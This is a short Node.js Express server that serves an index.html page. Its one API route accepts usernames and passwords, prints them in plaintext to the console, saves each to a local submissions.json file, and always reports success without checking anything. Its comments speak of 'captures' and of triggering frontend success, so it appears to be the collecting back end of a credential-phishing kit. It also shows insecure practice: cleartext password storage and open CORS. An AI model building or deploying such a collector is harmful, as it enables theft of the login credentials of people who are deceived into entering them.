const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const app = express();
const PORT = 3000;

const JSON_FILE_PATH = path.join(__dirname, 'submissions.json');

// Initialize local database storage file if it does not exist
if (!fs.existsSync(JSON_FILE_PATH)) {
  fs.writeFileSync(JSON_FILE_PATH, JSON.stringify([], null, 2));
}

// Global server configuration settings
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Route to serve your main user interface
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Route handling form submission and verification response data mapping
app.post('/api/get-result', (req, res) => {
  try {
    const { username, password, remember } = req.body;

    // Output submission details directly to your terminal logs
    console.log('📥 Data submission recorded:');
    console.log(`Username: ${username} | Password: ${password}`);

    const newEntry = {
      id: `ENTRY-${Date.now()}`,
      timestamp: new Date().toISOString(),
      username: username || "",
      password: password || "",
      additional_fields: {
        remember: remember === true || remember === 'true'
      }
    };

    // Read the log file, parse, push new entry, and save back to disk
    const fileData = fs.readFileSync(JSON_FILE_PATH, 'utf8');
    const entries = JSON.parse(fileData || '[]');
    entries.push(newEntry);
    fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(entries, null, 2));

    // Return a correct JSON response object to trigger frontend success logic
    return res.json({ success: true });

  } catch (err) {
    console.error("Database log failed:", err);
    return res.status(500).json({ success: false, error: "Internal server processing error." });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Live development server running at: http://localhost:${PORT}`);
  console.log(`📂 Captures routing straight to disk database: ${JSON_FILE_PATH}`);
});